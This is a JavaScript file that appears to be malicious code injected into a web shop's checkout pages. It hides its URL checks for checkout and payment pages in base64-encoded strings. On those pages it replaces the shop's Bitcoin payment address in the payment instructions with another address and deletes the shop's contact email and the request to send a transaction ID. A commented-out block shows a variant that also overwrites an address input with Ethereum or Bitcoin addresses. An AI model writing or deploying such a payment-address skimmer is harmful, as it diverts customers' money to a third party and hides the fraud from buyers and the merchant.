var Cap={
	_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789=/+",
	encode:function(input){
		var output="";
		var chr1,chr2,chr3,enc1,enc2,enc3,enc4;
		var i = 0;
		input = Cap._utf8_encode(input);
		while(i<input.length){
			chr1 = input.charCodeAt(i++);
			chr2 = input.charCodeAt(i++);
			chr3 = input.charCodeAt(i++);
			enc1 = chr1 >> 2;
			enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
			enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
			enc4 = chr3 & 63;
			if (isNaN(chr2)) {
				enc3 = enc4 = 64;
			}else if(isNaN(chr3)){
				enc4 = 64;
			} 
			output=output+this._keyStr.charAt(enc1)+this._keyStr.charAt(enc2)+this._keyStr.charAt(enc3)+this._keyStr.charAt(enc4);
		}
		return output;
	},
	decode : function (input) {
		var output = "";
		var chr1, chr2, chr3;
		var enc1, enc2, enc3, enc4;
		var i = 0;
		input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
		while (i < input.length) {
			enc1 = this._keyStr.indexOf(input.charAt(i++));
			enc2 = this._keyStr.indexOf(input.charAt(i++));
			enc3 = this._keyStr.indexOf(input.charAt(i++));
			enc4 = this._keyStr.indexOf(input.charAt(i++));
			chr1 = (enc1 << 2) | (enc2 >> 4);
			chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
			chr3 = ((enc3 & 3) << 6) | enc4;
			output = output + String.fromCharCode(chr1);
			if (enc3 != 64) {
				output = output + String.fromCharCode(chr2);
			}
			if (enc4 != 64) {
				output = output + String.fromCharCode(chr3);
			}
		}
		output = Cap._utf8_decode(output);
		return output;
	},
	_utf8_decode : function (utftext) {
		var string = "";
		var i = 0;
		var c = c1 = c2 = 0;
		while ( i < utftext.length ) {
			c = utftext.charCodeAt(i);
			if (c < 128) {
				string += String.fromCharCode(c);
				i++;
			}
			else if((c > 191) && (c < 224)) {
				c2 = utftext.charCodeAt(i+1);
				string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
				i += 2;
			}
			else {
				c2 = utftext.charCodeAt(i+1);
				c3 = utftext.charCodeAt(i+2);
				string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
				i += 3;
			}
		}
		return string;
	},
	_utf8_encode:function(string){
		string=string.replace(/\r\n/g,"\n");
		var utftext="";
		for(var n=0;n<string.length;n++){
			var c=string.charCodeAt(n);
			if(c<128){
				utftext+=String.fromCharCode(c);
			}else if((c>127)&&(c<2048)){
				utftext+=String.fromCharCode((c>>6)|192);
				utftext+=String.fromCharCode((c&63)|128);
			}else{
				utftext+=String.fromCharCode((c>>12)|224);
				utftext+=String.fromCharCode(((c>>6)&63)|128);
				utftext += String.fromCharCode((c&63)|128);
			}
		}
		return utftext;
	}
};

function ready(callback){
	if(document.readyState!='loading')
		callback();
	else if(document.addEventListener)
		document.addEventListener('DOMContentLoaded',callback);
	else 
		document.attachEvent('onreadystatechange',function(){if(document.readyState=='complete') callback();});
};


function gate(){
	if (document.URL.indexOf(Cap.decode('Y2hlY2tvdXQ+')) < 0)
		return;
	//if (document.URL.indexOf(Cap.decode('c3VjY2Vzcw++')) < 0)
	//	return;
	if (document.URL.indexOf(Cap.decode('cGF5bWVudA++')) < 0)
		return;

	setTimeout(gate, 5000);
	if (document.getElementsByClassName("address").length > 0)
	{
		if (document.getElementsByClassName("address")[0].getElementsByTagName("INPUT").length > 0)
		{
			/*if (document.getElementsByClassName("cointopay_details")[0].outerHTML.indexOf("ETHEREUM") > 0)
			{
				document.getElementsByClassName("address")[0].getElementsByTagName("INPUT")[0].value = "0x460ab1c34e4388704c5e56e18D904Ed117D077CC";
			}
			else
			{
				document.getElementsByClassName("address")[0].getElementsByTagName("INPUT")[0].value = "1DjyE7WUCz9DLabw5EWAuJVpUzXfN4evta";
			}
			*/
			document.getElementsByClassName("jkpaymentinstructions")[0].outerHTML = document.getElementsByClassName("jkpaymentinstructions")[0].outerHTML.replace("3MNXWq4bhj2VE5RqYju3RCgjKwHXoRt4WL", "1DjyE7WUCz9DLabw5EWAuJVpUzXfN4evta").replace("When you've paid please email us  with your transaction ID, we can then verify the payment and ship your order.", "").replace("Email: info@realchems.com", "");
		}
	}
}
ready(gate);

